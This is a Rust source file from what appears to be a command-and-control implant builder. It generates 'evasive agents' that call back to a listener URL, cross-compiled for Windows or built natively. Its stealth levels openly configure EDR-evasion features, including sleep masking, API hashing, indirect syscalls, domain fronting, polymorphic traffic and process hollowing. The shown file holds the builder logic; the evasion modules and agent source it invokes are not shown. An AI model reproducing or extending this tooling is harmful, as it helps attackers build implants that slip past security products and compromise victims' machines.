// src/agent/mod.rs - Enhanced Agent Generator with EDR Evasion (~100 lines)
use std::io;
use std::path::Path;
use std::fs::{File, create_dir_all, remove_dir_all};
use std::io::Write;
use std::process::Command;
use serde::{Serialize, Deserialize};

// Sub-modules for evasion techniques
pub mod evasion;
pub mod syscalls;
pub mod polymorphic;
pub mod environment;

use evasion::EvasionConfig;

#[derive(Clone)]
pub struct AgentGenerator;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentConfig {
    pub listener_url: String,
    pub format: String,
    pub architecture: String,
    pub sleep_time: u32,
    pub jitter: u8,
    pub injection: String,
    pub output_path: String,
    pub evasion_enabled: bool,
    pub stealth_level: StealthLevel,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum StealthLevel {
    Basic,      // Simple obfuscation
    Advanced,   // Syscalls + sleep masking
    Maximum,    // Full evasion suite
}

impl AgentGenerator {
    pub fn new() -> Self {
        AgentGenerator
    }
    
    // Main generation function with evasion support
    pub fn generate(&self, config: AgentConfig) -> io::Result<()> {
        println!("🎯 Generating evasive agent with config: {:?}", config);
        
        if let Some(parent) = Path::new(&config.output_path).parent() {
            create_dir_all(parent)?;
        }
        
        let wants_windows_exe = config.output_path.ends_with(".exe");
        
        if config.evasion_enabled {
            return self.generate_evasive_agent(config);
        }
        
        // Fallback to original generation for compatibility
        self.generate_standard_agent(config)
    }
    
    // Enhanced evasive agent generation
    fn generate_evasive_agent(&self, config: AgentConfig) -> io::Result<()> {
        println!("🛡️ Generating agent with {} evasion", format!("{:?}", config.stealth_level));
        
        let evasion_config = self.create_evasion_config(&config.stealth_level);
        
        if config.output_path.ends_with(".exe") {
            println!("🎯 Targeting Windows with evasion (.exe)");
            if let Ok(_) = self.try_evasive_cross_compile(&config, &evasion_config) {
                println!("✅ Evasive Windows agent ready: {}", config.output_path);
                return Ok(());
            }
        }
        
        if let Ok(_) = self.try_evasive_native_compile(&config, &evasion_config) {
            println!("✅ Evasive native agent ready: {}", config.output_path);
            return Ok(());
        }
        
        println!("⚠️ Direct compilation failed, creating evasive project...");
        self.generate_evasive_project(&config, &evasion_config)
    }
    
    // Create evasion configuration based on stealth level
    fn create_evasion_config(&self, stealth_level: &StealthLevel) -> EvasionConfig {
        match stealth_level {
            StealthLevel::Basic => EvasionConfig {
                sleep_mask: false,
                api_hashing: true,
                indirect_syscalls: false,
                domain_fronting: false,
                jitter_percentage: 15,
                user_agent_rotation: true,
                polymorphic_requests: false,
                ssl_pinning: false,
                process_hollowing: false,
            },
            StealthLevel::Advanced => EvasionConfig {
                sleep_mask: true,
                api_hashing: true,
                indirect_syscalls: true,
                domain_fronting: false,
                jitter_percentage: 25,
                user_agent_rotation: true,
                polymorphic_requests: true,
                ssl_pinning: false,
                process_hollowing: false,
            },
            StealthLevel::Maximum => EvasionConfig {
                sleep_mask: true,
                api_hashing: true,
                indirect_syscalls: true,
                domain_fronting: true,
                jitter_percentage: 35,
                user_agent_rotation: true,
                polymorphic_requests: true,
                ssl_pinning: false,
                process_hollowing: true,
            },
        }
    }
    
    // Evasive compilation methods
    fn try_evasive_cross_compile(&self, config: &AgentConfig, evasion_config: &EvasionConfig) -> io::Result<()> {
        println!("🔨 Cross-compiling evasive agent for Windows...");
        
        let temp_dir = "/tmp/evasive_agent_cross";
        self.create_evasive_rust_project(temp_dir, config, evasion_config)?;
        
        let output = Command::new("cargo")
            .args(&["build", "--release", "--target", "x86_64-pc-windows-gnu"])
            .current_dir(temp_dir)
            .output()?;
        
        if !output.status.success() {
            let _ = remove_dir_all(temp_dir);
            return Err(io::Error::new(io::ErrorKind::Other, "Cross-compilation failed"));
        }
        
        let source = format!("{}/target/x86_64-pc-windows-gnu/release/evasive_agent.exe", temp_dir);
        if Path::new(&source).exists() {
            std::fs::copy(&source, &config.output_path)?;
            let _ = remove_dir_all(temp_dir);
            return Ok(());
        }
        
        Err(io::Error::new(io::ErrorKind::NotFound, "Binary not found"))
    }
    
    fn try_evasive_native_compile(&self, config: &AgentConfig, evasion_config: &EvasionConfig) -> io::Result<()> {
        println!("🔨 Native compilation of evasive agent...");
        
        let temp_dir = "/tmp/evasive_agent_native";
        self.create_evasive_rust_project(temp_dir, config, evasion_config)?;
        
        let output = Command::new("cargo")
            .args(&["build", "--release"])
            .current_dir(temp_dir)
            .output()?;
        
        if !output.status.success() {
            let _ = remove_dir_all(temp_dir);
            return Err(io::Error::new(io::ErrorKind::Other, "Native compilation failed"));
        }
        
        for source in &[
            format!("{}/target/release/evasive_agent", temp_dir),
            format!("{}/target/release/evasive_agent.exe", temp_dir)
        ] {
            if Path::new(source).exists() {
                std::fs::copy(source, &config.output_path)?;
                Self::make_executable(&config.output_path)?;
                let _ = remove_dir_all(temp_dir);
                return Ok(());
            }
        }
        
        Err(io::Error::new(io::ErrorKind::NotFound, "Binary not found"))
    }
    
    fn generate_evasive_project(&self, config: &AgentConfig, evasion_config: &EvasionConfig) -> io::Result<()> {
        let project_dir = format!("{}_evasive_project", config.output_path.trim_end_matches(".exe"));
        create_dir_all(&project_dir)?;
        self.create_evasive_rust_project(&project_dir, config, evasion_config)?;
        println!("✅ Evasive project created: {}", project_dir);
        Ok(())
    }
    
    fn create_evasive_rust_project(&self, project_dir: &str, config: &AgentConfig, evasion_config: &EvasionConfig) -> io::Result<()> {
        create_dir_all(format!("{}/src", project_dir))?;
        
        // Enhanced Cargo.toml with evasion dependencies
        let cargo_toml = self.generate_evasive_cargo_toml();
        let mut cargo_file = File::create(format!("{}/Cargo.toml", project_dir))?;
        cargo_file.write_all(cargo_toml.as_bytes())?;
        
        // Main evasive agent source
        let main_source = self.generate_evasive_source(config, evasion_config);
        let mut main_file = File::create(format!("{}/src/main.rs", project_dir))?;
        main_file.write_all(main_source.as_bytes())?;
        
        // Create evasion modules
        self.create_evasion_modules(project_dir)?;
        
        Ok(())
    }
    
    fn make_executable(path: &str) -> io::Result<()> {
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mut perms = std::fs::metadata(path)?.permissions();
            perms.set_mode(0o755);
            std::fs::set_permissions(path, perms)?;
        }
        Ok(())
    }
}